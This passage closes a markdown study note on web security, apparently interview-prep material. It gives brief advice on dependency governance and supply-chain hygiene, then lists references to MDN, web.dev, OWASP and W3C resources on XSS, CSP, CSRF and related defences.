Add governance on top: a review step for adding a *new* dependency (maintenance, size, transitive tree, install scripts), periodic pruning of unused packages, and provenance/trusted publishing for your own packages. Recommendation: lockfile + delayed, reviewed updates + no install scripts by default; that combination would have blocked most of the 2025 maintainer-account compromises, which were pulled within hours.

> **Note:** Related questions answered elsewhere: [DOM manipulation](../../03-javascript/23-dom-manipulation/notes.md#interview-questions) (why `innerHTML` with user data is dangerous), [Media, SVG, canvas and iframes](../../01-html/09-media-svg-canvas-iframe/notes.md#interview-questions) (iframe security from both sides).

## References

- [MDN: Same-origin policy](https://developer.mozilla.org/en-US/docs/Web/Security/Defenses/Same-origin_policy)
- [MDN: Cross-site scripting (XSS)](https://developer.mozilla.org/en-US/docs/Web/Security/Attacks/XSS)
- [MDN: Content Security Policy (CSP)](https://developer.mozilla.org/en-US/docs/Web/HTTP/Guides/CSP)
- [MDN: Trusted Types API](https://developer.mozilla.org/en-US/docs/Web/API/Trusted_Types_API)
- [MDN: HTML Sanitizer API](https://developer.mozilla.org/en-US/docs/Web/API/HTML_Sanitizer_API)
- [MDN: Cross-site request forgery (CSRF)](https://developer.mozilla.org/en-US/docs/Web/Security/Attacks/CSRF)
- [MDN: Clickjacking](https://developer.mozilla.org/en-US/docs/Web/Security/Attacks/Clickjacking)
- [MDN: Subresource Integrity](https://developer.mozilla.org/en-US/docs/Web/Security/Defenses/Subresource_Integrity)
- [MDN: Window.postMessage()](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage)
- [MDN: Strict-Transport-Security](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Strict-Transport-Security)
- [web.dev: Mitigate cross-site scripting with a strict CSP](https://web.dev/articles/strict-csp)
- [web.dev: Prevent DOM-based XSS with Trusted Types](https://web.dev/articles/trusted-types)
- [web.dev: Protect your resources from web attacks with Fetch Metadata](https://web.dev/articles/fetch-metadata)
- [web.dev: SameSite cookies explained](https://web.dev/articles/samesite-cookies-explained)
- [OWASP: Cross Site Scripting Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [OWASP: DOM based XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html)
- [OWASP: Cross-Site Request Forgery Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
- [OWASP: Unvalidated Redirects and Forwards Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html)
- [OWASP: HTTP Security Response Headers Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/HTTP_Headers_Cheat_Sheet.html)
- [W3C: Content Security Policy Level 3](https://www.w3.org/TR/CSP3/)
- [DOMPurify on GitHub](https://github.com/cure53/DOMPurify)
